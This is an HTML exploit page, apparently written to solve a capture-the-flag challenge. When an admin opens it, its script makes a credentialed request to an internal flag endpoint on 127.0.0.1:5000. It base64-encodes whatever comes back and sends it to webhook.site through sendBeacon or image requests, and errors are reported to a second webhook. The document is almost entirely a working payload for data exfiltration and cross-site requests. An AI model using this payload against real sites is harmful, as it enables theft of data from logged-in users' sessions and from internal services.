<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>exploit</title>
</head>
<body>
  <h2>collector page</h2>
  <p>Waiting for admin visitâ€¦</p>

  <script>
  (async function(){
    try {
      // adjust target if you know a different internal host/port
      const target = "http://127.0.0.1:5000/api/fetchflag";
      const WH = "https://webhook.site/6cd5ca68-6f38-4b62-ac03-db4442d880d6";

      // Try to fetch and read the body (works if same-origin or CORS allowed)
      let text = null;
      try {
        const r = await fetch(target, { credentials: 'include' });
        if (r && r.ok) {
          try { text = await r.text(); } catch(e){ text = null; }
        }
      } catch(e) { /* ignore, fallback below */ }

      // If body not readable, at least fire a no-cors request so the admin issues the request
      if (!text) {
        try { await fetch(target, { mode: 'no-cors', credentials: 'include' }); } catch(e){ /* ignore */ }
      }

      // Exfiltrate if we have the body; otherwise signal that the request fired
      if (text) {
        // safe base64 for Unicode
        const b64 = btoa(unescape(encodeURIComponent(text)));
        const url = WH + "?flag=" + encodeURIComponent(b64);
        if (navigator.sendBeacon) {
          try { navigator.sendBeacon(url); }
          catch(e) { new Image().src = url; }
        } else {
          new Image().src = url;
        }
      } else {
        // notify that the internal fetch was attempted but body not available
        new Image().src = WH + "?note=fired_no_body&r=" + Math.random();
      }
    } catch (err) {
      // best-effort error reporting
      try { new Image().src = "https://webhook.site/e600413c-4e6f-4338-8d5a-119b46c59825?err=" + encodeURIComponent(err + ""); } catch(_) {}
    }
  })();
  </script>
</body>
</html>
